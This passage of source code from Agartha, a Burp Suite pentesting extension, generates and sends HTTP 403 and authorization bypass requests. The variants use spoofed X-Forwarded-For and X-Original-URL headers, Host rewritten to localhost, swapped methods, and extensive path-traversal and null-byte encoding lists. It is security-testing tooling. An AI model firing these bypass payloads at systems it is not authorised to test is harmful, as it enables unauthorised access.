                
        self._lblAuthenticationNotification.text = "Just a moment, the table dimension is being calculated."
        self.errorNumbers = 0
        try:
            self.attmeptPossibilities()
            _progressBar = 1000000 / ( self.cellNumbers)
            _columnNum = 0
            for x in range(0, self.tableMatrixAuthentication_DM.getRowCount()):
                _columnNum = 0
                _reqRes =[]
                _cellHint = []
                _rowUrls = []
                _portNum = 80
                if urlparse.urlparse(str(_matrixList[x][0])).port:
                    _portNum = urlparse.urlparse(str(_matrixList[x][0])).port
                else:
                    if urlparse.urlparse(str(_matrixList[x][0])).scheme == "https":
                        _portNum = 443

                _body = _matrixList[x][2]
                _urls = self.urlDuplicator(_matrixList[x][0])
                _searchFor = '/'
                _replaceWith = ''
                # column0 Urls
                _cellHint.append("URL list.")
                # column0


                # column1 Base Request
                _url = str(_matrixList[x][0])
                _rowUrls.append(_url)
                _header = list(_matrixList[x][1])
                _reqRes.append(_url)
                self._httpCalls =[]
                _columnNum = _columnNum + 1
                _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                _cellHint.append("Base request: '" + _url + "'")
                # column1


                # column2 Http request method has been replaced with others
                _reqMethods = ["ABC ", "TRACE ", "CONNECT ", "PATCH ", "DEBUG "]
                _headerOrg = list(_matrixList[x][1])
                for _reqMethod in _reqMethods:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, _reqMethod + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("Http request method has been replaced with '"+ _reqMethod + "', '" + _url + "'")
                # column2


                # column3 'X-*' parameter has been added to the header.
                _headerParams = ["X-Originating-IP: ", "X-Forwarded-For: ", "X-Forwarded: ", "X-Remote-IP: ", "X-Remote-Addr: ", "X-ProxyUser-Ip: ", "X-Client-IP: ", "True-Client-IP: ", "Cluster-Client-IP: ", "X-Custom-IP-Authorization: ", "X-Forward-For: ", "X-Real-IP: ", "X-Host: ", "X-Forwarded-Host: ", "X-Trusted-IP: ", "X-Forwarded-Server: "]
                _headerValues = ["127.0.0.1", _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[0] + "//" + _url.replace(urlparse.urlparse(_url).netloc.split(':',1)[0], 'localhost').split('/',3)[2]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _headerValue in _headerValues:
                        for _url in _urls:
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            _header.insert(2, _headerParam + _headerValue)
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("'" + _headerParam[:-2] + "' parameter has been added to the request header, '" + _url + "'")
                # column3


                # column4 'X-*' parameter has been added to the header.
                _headerParams = ["X-Original-URL: ", "X-Rewrite-URL: ", "X-Override-URL: ", "X-Http-Destinationurl: ", "X-Proxy-Url: "]
                _headerValues = [_url.split("/", 3)[3]]
                _headerOrg = list(_matrixList[x][1])
                for _headerParam in _headerParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(1, _headerParam + urlparse.urlparse(_url).path)
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'" + _headerParam + "' parameter has been added to the request header, '" + _url + "'")
                # column4


                # column5 'Host' parameter has been replaced with 'localhost'
                _hostParams = ["localhost", "127.0.0.1"]
                _headerOrg = list(_matrixList[x][1])
                for _hostParam in _hostParams:
                    for _url in _urls:
                        _header = list(_headerOrg[1:])
                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " " + _url[_url.rfind(urlparse.urlparse(_url).path):] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                        for line in _header:
                            if line.startswith("Host: "):
                                _header.remove(line)
                                break
                        _header.insert(1, "Host: " + _hostParam)
                        self._httpCalls =[]
                        _columnNum = _columnNum + 1
                        _reqRes.append(self.authenticationMatrixCalls(_url, _header, _body, _portNum, x, _columnNum, _progressBar))
                        _cellHint.append("'Host' parameter has been replaced with '" + _hostParam + "', '" + _url + "'")
                # column5


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _header = list(_headerOrg[1:])
                                        _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                        self._httpCalls =[]
                                        _columnNum = _columnNum + 1
                                        _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                        _cellHint.append("Target URL is '" + url + "'")
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column8


                # column9, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin%00?id=1
                #                       http://dvwa.local/company/users/admin%00/?id=1
                #                       http://dvwa.local/company/users/admin../?id=1
                #                       http://dvwa.local/company/users/admin/../?id=1
                #                       http://dvwa.local/company/users/admin..;/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = [".", "./", "../", "/../", "/./", "/.", "/..", "..", "..;/", ".;/", "/..;", "/.;", "/..;/", "/.;/", "%09", "%09/", "/..%09", "..%09", "/.%09", ".%09", "%00", "%00/", "/..%00", "..%00", "/.%00", ".%00", "%ff", "%ff/", "/..%ff", "..%ff", "/.%ff", ".%ff", "%01", "%01/", "/..%01", "..%01", "/.%01", ".%01", "%20", "%20/", "/..%20", "..%20", "/.%20", ".%20", "%0a", "%0a/", "/..%0a", "..%0a", "/.%0a", ".%0a", "%0d", "%0d/", "/..%0d", "..%0d", "/.%0d", ".%0d", "/*", "*", "%2f"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                            url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        url = url.replace("//", "/").replace(":/", "://")
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column9


                # column10, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin/%09/?id=1
                #                           http://dvwa.local/company/%09/users/admin/%09/?id=1
                #                           http://dvwa.local/company/users/%09/admin/%09/?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column10


                # column11, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin%09?id=1
                #                           http://dvwa.local/company/%09/users/admin%09?id=1
                #                           http://dvwa.local/company/users/%09/admin%09?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            if urlparse.urlparse(_url).path.endswith("/") and _url.count('/') != 3:
                                _url = _url[: _locations[-1]] + _replaceWith + _url[_locations[-1]:]
                            else:
                                _url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _replaceWith[1:-1] + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            _url = _url.replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column11


                # column12, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1/%09/
                #                           http://dvwa.local/company/%09/users/admin?id=1/%09/
                #                           http://dvwa.local/company/users/%09/admin?id=1/%09/
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _headerOrg = list(_matrixList[x][1])
                _fileExtensions = [".js", ".html", ".js%2f", ".html%2f", ";index.html", "%00.html", "%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _header = list(_headerOrg[1:])
                                _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                self._httpCalls =[]
                                _columnNum = _columnNum + 1
                                _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                _cellHint.append("Target URL is '" + url + "'")
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column19


                self._httpReqResAuthentication.append(_reqRes)
                self._httpReqResAuthenticationTipMessage.append(_cellHint)


            self.currentText = "The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
            if _authType == 1:
                self.currentText = self.currentText + " ' * ' sign at the end shows SSO interaction."
            if self.errorNumbers != 0:
                successRate = 100 - 100 * float(self.errorNumbers) / float(self.cellNumbers)
                if successRate > 69:
                    self.currentText = "Successful connection rate is " + str(int(successRate)) + "%"
                    self.currentText = self.currentText + ". The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
                    if _authType == 1:
                        self.currentText = self.currentText + " ' * ' sign at the end shows SSO interaction."
                else:
                    self.currentText = "Successful connection rate is very low, please check your network connection!"
            
            self.progressBarAuthenticationPanel.setValue(1000000)
            self._btnAuthenticationFetchHistory.setEnabled(True)
            self._btnAuthenticationReset.setEnabled(True)
            self._cbAuthenticationHost.setEnabled(True)
            self._btnAuthenticationRun.setEnabled(True)
            self._customRendererAuthentication =  UserEnabledRenderer(self.tableMatrixAuthentication.getDefaultRenderer(str), self._httpReqResAuthentication, self._httpReqResAuthenticationTipMessage)
            self._customTableColumnModelAuthentication = self.tableMatrixAuthentication.getColumnModel()

            _setPreferredWidth = (self.tableMatrixAuthentication.getWidth() - 400) / self.tableMatrixAuthentication.getColumnCount()
            if _setPreferredWidth < 40:
                _setPreferredWidth = 40
            for y in range(1, self.tableMatrixAuthentication.getColumnCount()):
                self._customTableColumnModelAuthentication.getColumn(y).setCellRenderer(self._customRendererAuthentication)
                self.tableMatrixAuthentication.getColumnModel().getColumn(y).setPreferredWidth(_setPreferredWidth)
            self._customTableColumnModelAuthentication.getColumn(0).setCellRenderer(self._customRendererAuthentication)
            self.tableMatrixAuthentication.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
            self.tableMatrixAuthentication.repaint()

            sleep(0.1)
            colors = ""
            if self._customRendererAuthentication._colorsRed:
                colors += "Red"
            if self._customRendererAuthentication._colorsOrange:
                if colors:
                    colors += ", Orange"
                else:
                    colors += "Orange"
            if self._customRendererAuthentication._colorsYellow:
                if colors:
                    colors += ", Yellow"
                else:
                    colors += "Yellow"
            
            if colors:
                if colors.count(",") >= 1:
                    colors += " colors show different level of possible access violations"
                else:
                    colors += " color shows possible access violations"

            if colors:
                self.currentText = self.currentText.replace("Blank is default color, which indicates no issue has been found.", colors +", however blank is default color, which indicates no issue has been found.")
            self._lblAuthenticationNotification.text = self.currentText

        except:
            print str(sys.exc_info()[1])

        return

    def urlFinder(self, path, url):
        if '..' in path:
            if (url.count('/') - 3) >= path.count('..'):
                return posixpath.normpath(url.rsplit('/',1)[0] + "/" + path).replace('http:/','http://')
            else:
                return url.split('/',3)[0] + "//" + url.split('/',3)[2] + "/" + path.rsplit('../',1)[1]
        elif path.startswith('http'):
            return path
        else:
            if path.startswith('/'):
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + path
            else:
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + "/" + path

    def _tabHelpUI(self):
        self._tabHelpJPanel = JPanel(BorderLayout())
        self._tabHelpJPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self.editorPaneInfo = JEditorPane()
        self.editorPaneInfo.setEditable(False)
        self.editorPaneInfo.setContentType("text/html");
        htmlString ="<html><body><table width=1000 border=0 cellspacing=0><tr><td><h3>Author:\t\t\tVolkan Dindar<br/>Github:\t\t\thttps://github.com/volkandindar/agartha</h3>"
        htmlString += """
        <h1>Agartha - LFI, RCE, SQLi, Auth, HTTP to JS</h1>
        <p>Agartha, specializes in advance payload generation and access control assessment. It adeptly identifies vulnerabilities related to injection attacks, and authentication/authorization issues. The dynamic payload generator crafts extensive wordlists for various injection vectors, including SQL Injection, Local File Inclusion (LFI), and Remote Code Execution(RCE). Furthermore, the extension constructs a comprehensive user access matrix, revealing potential access violations and privilege escalation paths. It also assists in performing HTTP 403 bypass checks, shedding light on auth misconfigurations. Additionally, it can convert HTTP requests to JavaScript code to help digging up XSS issues more.</p>
        <p>In summary:</p>
        <ul>
        <li><strong>Payload Generator</strong>: It dynamically constructs comprehensive wordlists for injection attacks, incorporating various encoding and escaping characters to enhance the effectiveness of security testing. These wordlists cover critical vulnerabilities such as SQL Injection, Local File Inclusion (LFI), and Remote Code Execution, making them indispensable for robust security testing.<ul>
        <li><strong>Local File Inclusion, Path Traversal:</strong> It helps identifying vulnerabilities that allow attackers to access files on the server&#39;s filesystem.</li>
        <li><strong>Remote Code Execution, Command Injection:</strong> It aims to detects potential command injection points, enabling robust testing for code execution vulnerabilities.</li>
